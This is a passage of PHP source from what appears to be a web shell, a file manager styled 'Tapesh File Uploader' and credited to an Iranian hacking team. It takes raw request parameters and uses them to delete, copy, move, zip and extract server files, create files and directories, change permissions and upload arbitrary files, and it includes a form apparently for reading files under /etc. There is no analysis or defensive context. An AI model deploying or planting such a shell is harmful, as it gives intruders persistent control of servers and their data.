                @mkdir($dest);
                chmod($dest,$options['filePermission']);
            }
        } else {
            if ($source[strlen($source)-1]=='/') {
                @mkdir($dest,$options['folderPermission']);
                chmod($dest,$options['filePermission']);
            } else {
                @mkdir($dest,$options['folderPermission']);
                chmod($dest,$options['filePermission']);
            }
        }
        $dirHandle=opendir($source);
        while($file=readdir($dirHandle))
        {
            if($file!="." && $file!="..")
            {
                $__dest=$dest."/".$file;
                $__source=$source."/".$file;
                if ($__source!=$dest) {
                    $result=smartrename($__source, $__dest, $options);
                }
            }
        }
        closedir($dirHandle);
    } else {
        $result=false;
    }
    return $result;
}
    if(isset($_GET['remove_Your']))
    {
        deleteFolder($data);
        unlink($data);
        for ($i=1;$i + 1 < $count;$i++)
        {
            $data2 = $path."/".$step1[$i];
            deleteFolder($data2);
            unlink($data2);
        }
    }
    if(isset($_GET['copy_work']))
    {
        $address = $_GET['copy_name'];
        $step1 = explode('=on&',$shellname);
        $step2 = explode('?',$step1[0]);
        $count = count($step1);
        $data = $path."/".$step2[1];
        smartCopy($data,$path."/".$address."/".$step2[1]);
        for ($i=1;$i + 1 < $count;$i++)
        {
            $data2 = $path."/".$step1[$i];
            smartCopy($data2,$path."/".$address."/".$step1[$i]);
        }
    }
    if(isset($_GET['Move_work']))
    {
        $address = $_GET['Move_name'];
        $step1 = explode('=on&',$shellname);
        $step2 = explode('?',$step1[0]);
        $count = count($step1);
        $data = $path."/".$step2[1];

        smartrename($data,$path."/".$address."/".$step2[1]);
        for ($i=1;$i + 1 < $count;$i++)
        {
            $data2 = $path."/".$step1[$i];
            smartrename($data2,$path."/".$address."/".$step1[$i]);
        }
    }
    if(isset($_GET['zip_work']))
    {
        $step1 = explode('=on&',$shellname);
        $step2 = explode('?',$step1[0]);
        $count = count($step1);
        $data = $step2[1];
        $name = $_GET['zip_name'];
        $zip = new ZipArchive();
        $zip->open($name, ZipArchive::CREATE);

        $zip->addFile($data);
        for ($i=1;$i + 1 < $count;$i++)
        {
            $data2 = $step1[$i];
            $zip->addFile($data2);
        }
        $zip->close();
    }
    if(isset($_GET['Unzip_work']))
    {
        $step1 = explode('=on&',$shellname);
        $step2 = explode('?',$step1[0]);
        $count = count($step1);
        $zip = new ZipArchive();
        $data = $path."/".$step2[1];
        $res = $zip->open($data);
        if ($res === TRUE) {
            $zip->extractTo($path);
            echo "success !";
        } else {
            echo "fail !";
        }
        for ($i=1;$i + 1 < $count;$i++)
        {
            $data2 = $step1[$i];
            $res2 = $zip->open($data2);
            if ($res2 === TRUE) {
                $zip->extractTo($path);
                echo "success !";
            } else {
                echo "fail !";
            }
        }
        $zip->close();
    }
function createDirectory() {
    $add = $_POST["add"];
    mkdir("".$add);
    header("refresh: 3;");
}
?>


<div class="c-footer">


    <div class="c-footer_button">
        <br>
        <br>
        <div class="btn-footer">
            <?php
            $name = $_POST['addmkdir'];
            mkdir($name);
            getcwd();
            ?>
            <label class="c-label">Make Directory : </label>
            <form action="" method="post">
                <input type="text" name="addmkdir">
                <input type="submit" class="c-default_btn" value="mkdir">
            </form>
        </div>

        <div class="btn-footer">
            <label class="c-label">Make File : </label>
            <form action="" method="post">
                <input type="text" name="addmkfile">
                <input type="submit"  class="c-default_btn" value="mkfile">
            </form>
            <?php
            $FileName = $_POST['addmkfile'];
            fopen($FileName, 'w');
            getcwd();
            ?>
        </div>
        <div class="btn-footer">
            <label class="c-label">Add Chmod : </label>
            <form action="" method="post">
                <input type="text" name="chmod">
                <input type="submit" class="c-default_btn" value="chmod">
            </form>
            <?php
            $chmod = $_POST['chmod'];
            chmod($chmod, 755);
            getcwd();
            ?>
        </div>
        <div class="btn-footer">
            <label class="c-label">Get etc : </label>
            <form action="" method="post">
                <input type="text" name="etc">
                <input type="submit" class="c-default_btn" value="Read etc">
            </form>
        </div>
    </div>
    <div class="c-footer_background"></div>
    <?php
    echo "\n<body bgcolor=#000000>\n<br>\n<center><font color=\"green\"><big>..:: Tapesh File Uploader ::..";
    echo '<br></font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#00ddff;margin-bottom:4px;"/><input type="submit" class="c-default_btn" value="Upload" /></form></td></tr><tr><td colspan="2">';
    if (isset($_FILES['file'])) {
        if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
            echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';

        } else {
            echo '<center><font color="red">Upload FAILED!</font></center><br/>';
        }
    }
    ?> <br>

    <center> <font color="red">
            <a  style="color:red;" href="https://t.me/ICTUS_TM"><span class="copyright">[ /./ ICTUS Digital Security Team Iran Â© 2020-2021 ]</span></a> </center>
    </font>
</div>
</div>
</body>
</html>
